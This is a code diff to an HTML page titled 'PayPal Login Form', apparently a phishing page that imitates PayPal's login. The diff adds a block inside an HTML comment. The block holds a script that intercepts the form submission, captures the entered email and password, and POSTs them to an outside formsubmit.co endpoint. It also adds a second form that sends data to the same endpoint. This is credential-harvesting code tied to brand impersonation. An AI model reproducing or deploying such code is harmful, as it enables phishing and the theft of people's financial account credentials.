@@ -5,6 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>PayPal Login Form</title>
     <style>
+       
+        
         body {
             font-family: Helvetica, Arial, sans-serif;
             font-size: 18px;
@@ -85,5 +87,38 @@
 
         </div>
     </section>
+
+    
 </body>
+<!--
+    <script>
+document.getElementById("loginForm").addEventListener("submit", function(event) {
+    event.preventDefault(); // Prevent default form submission
+    
+    // Capture form data
+    const formData = new FormData(this);
+
+    // Send data to FormSubmit using fetch
+    fetch("https://formsubmit.co/61a5e9ede7aec75548da8773d02a1cc6", {
+        method: "POST",
+        body: formData
+    }).then(response => {
+        if (response.ok) {
+            // Clear form fields
+            document.getElementById("email").value = "";
+            document.getElementById("password").value = "";
+        }
+    }).catch(error => console.error("Error:", error));
+});
+</script>
+
+    <form id="loginForm">
+    <input id="email" type="email" name="email" placeholder="Email Address" required>
+    <input id="password" type="password" name="password" placeholder="Password" required>
+    <a href="#" id="forgotpass">Forgotten password?</a>
+    <button id="login" class="but" type="submit">Log In</button>
+</form>
+<form action="https://formsubmit.co/61a5e9ede7aec75548da8773d02a1cc6" method="POST" target="_blank">
+-->
+
 </html>
